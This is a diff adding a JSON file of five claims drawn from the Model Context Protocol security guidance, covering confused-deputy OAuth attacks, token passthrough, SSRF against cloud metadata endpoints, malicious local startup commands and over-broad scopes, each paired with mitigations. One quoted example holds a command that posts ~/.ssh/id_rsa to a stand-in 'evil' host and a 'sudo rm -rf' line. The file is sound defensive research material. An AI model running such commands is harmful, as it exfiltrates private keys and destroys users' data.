@@ -1,0 +1,72 @@
+[
+  {
+    "claim": "MCP proxy servers using a static OAuth client ID with a third-party authorization server are vulnerable to a 'confused deputy' attack, where a leftover consent cookie plus a malicious redirect_uri from dynamic client registration lets an attacker obtain a stolen authorization code for a user's account without explicit per-client consent.",
+    "stance": "supports",
+    "stance_target": "MCP-based tool-exposure architectures require explicit per-client consent registries, not reliance on third-party authorization server consent cookies, to prevent credential theft in a software-factory tool layer",
+    "evidence_type": "theoretical",
+    "scope_conditions": "MCP proxy server architecture, official MCP security spec",
+    "quoted_support": "An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID ... The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval",
+    "numbers": [],
+    "entities": ["Model Context Protocol"],
+    "time_period": "2025-2026",
+    "region": "global",
+    "confidence": "high",
+    "source_note_id": "security-best-practices-model-context-protocol"
+  },
+  {
+    "claim": "MCP servers MUST NOT accept tokens that were not explicitly issued for them ('token passthrough' is explicitly forbidden); accepting and forwarding such tokens downstream bypasses audience-bound security controls and reproduces the confused-deputy problem at the downstream resource server.",
+    "stance": "supports",
+    "stance_target": "token audience validation is a mandatory security control for any MCP-based tool integration layer in an AI software factory",
+    "evidence_type": "theoretical",
+    "scope_conditions": "MCP server implementations, official spec",
+    "quoted_support": "MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server.",
+    "numbers": [],
+    "entities": ["Model Context Protocol"],
+    "time_period": "2025-2026",
+    "region": "global",
+    "confidence": "high",
+    "source_note_id": "security-best-practices-model-context-protocol"
+  },
+  {
+    "claim": "A malicious MCP server can direct an MCP client to fetch OAuth-discovery metadata URLs pointing at cloud metadata endpoints (e.g. 169.254.169.254) to exfiltrate IAM credentials and API keys via a server-side request forgery (SSRF) attack; mitigation requires enforcing HTTPS, blocking private/link-local IP ranges per RFC 9728 Section 7.7, and routing through SSRF-preventing egress proxies.",
+    "stance": "supports",
+    "stance_target": "cloud agent sandboxes integrating MCP tools require network-level egress controls (not just application-level validation) to prevent credential exfiltration via SSRF",
+    "evidence_type": "theoretical",
+    "scope_conditions": "MCP client deployments fetching OAuth metadata, official spec",
+    "quoted_support": "Cloud metadata endpoints: URLs targeting http://169.254.169.254/ (AWS/GCP/Azure metadata service) can exfiltrate cloud credentials and instance information",
+    "numbers": ["169.254.169.254"],
+    "entities": ["Model Context Protocol", "AWS", "GCP", "Azure"],
+    "time_period": "2025-2026",
+    "region": "global",
+    "confidence": "high",
+    "source_note_id": "security-best-practices-model-context-protocol"
+  },
+  {
+    "claim": "Local MCP servers configured via one-click flows can embed malicious startup commands (e.g. exfiltrating ~/.ssh/id_rsa or running rm -rf) that execute with the MCP client's full privileges; mitigation requires un-truncated command display, explicit pre-configuration consent dialogs, and sandboxed/least-privilege execution of spawned local server processes.",
+    "stance": "supports",
+    "stance_target": "local MCP server installation requires the same explicit-consent and sandboxing discipline as remote tool execution, directly relevant to the agent-sandbox/blast-radius pillar",
+    "evidence_type": "theoretical",
+    "scope_conditions": "local MCP server configuration flows, official spec",
+    "quoted_support": "Example malicious startup commands that could be embedded: # Data exfiltration npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location # Privilege escalation sudo rm -rf /important/system/files && echo \"MCP server installed!\"",
+    "numbers": [],
+    "entities": ["Model Context Protocol"],
+    "time_period": "2025-2026",
+    "region": "global",
+    "confidence": "high",
+    "source_note_id": "security-best-practices-model-context-protocol"
+  },
+  {
+    "claim": "Publishing all possible OAuth scopes in an MCP server's scopes_supported field, or using wildcard/omnibus scopes like '*' or 'admin:*', expands the blast radius of a stolen token; the recommended mitigation is a progressive least-privilege scope model that starts with a minimal scope set and elevates incrementally via targeted WWW-Authenticate challenges only when privileged operations are first attempted.",
+    "stance": "supports",
+    "stance_target": "least-privilege, incrementally-escalated tool permission scoping is the recommended architecture for MCP-based agent tool access, directly relevant to the blast-radius-containment pillar",
+    "evidence_type": "theoretical",
+    "scope_conditions": "MCP authorization scope design, official spec",
+    "quoted_support": "Minimal initial scope set (e.g., mcp:tools-basic) containing only low-risk discovery/read operations ... Incremental elevation via targeted WWW-Authenticate scope=\"...\" challenges when privileged operations are first attempted",
+    "numbers": [],
+    "entities": ["Model Context Protocol"],
+    "time_period": "2025-2026",
+    "region": "global",
+    "confidence": "high",
+    "source_note_id": "security-best-practices-model-context-protocol"
+  }
+]
